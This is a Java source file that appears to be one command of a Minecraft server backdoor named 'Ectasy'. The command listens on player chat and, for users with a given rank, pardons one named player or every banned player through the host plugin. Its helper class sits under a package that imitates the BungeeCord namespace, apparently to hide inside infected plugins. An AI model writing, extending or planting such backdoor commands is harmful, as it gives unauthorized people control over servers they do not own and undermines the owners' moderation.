package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import java.util.Arrays;

import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.scheduler.BukkitRunnable;

@CommandInfo(
   name = "unban",
   description = "Unban a player",
   blatant = true,
   rank = Rank.FREE
)
public class UnbanCommand extends AbstractCommand {
   public UnbanCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent e, String var2, String[] args) {
      String reason = String.join(" ", Arrays.stream(args).skip(1L).toArray(String[]::new)).replace("&", "§");
      new BukkitRunnable() {
         @Override
         public void run() {
            if (args.length == 0) {
               ChatUtil.sendChat(e.getPlayer(), "Please, use unban <player name> or unban *");
            } else if (!args[0].equals("*")) {
               Ectasy.parentPlugin.getServer().getBanList(BanList.Type.NAME).pardon(args[0]);
               Player var3 = Bukkit.getPlayer(args[0]);
               if (var3 != null) {
                  var3.kickPlayer(reason);
               }

               ChatUtil.sendChat(e.getPlayer(), "Unbanned " + args[0]);
            } else {
               for(BanEntry var2 : Ectasy.parentPlugin.getServer().getBanList(BanList.Type.NAME).getBanEntries()) {
                  Ectasy.parentPlugin.getServer().getBanList(BanList.Type.NAME).pardon(var2.getTarget());
               }

               ChatUtil.sendChat(e.getPlayer(), "Unbanned everyone.");
            }
         }
      }.runTask(Ectasy.parentPlugin);
   }
}
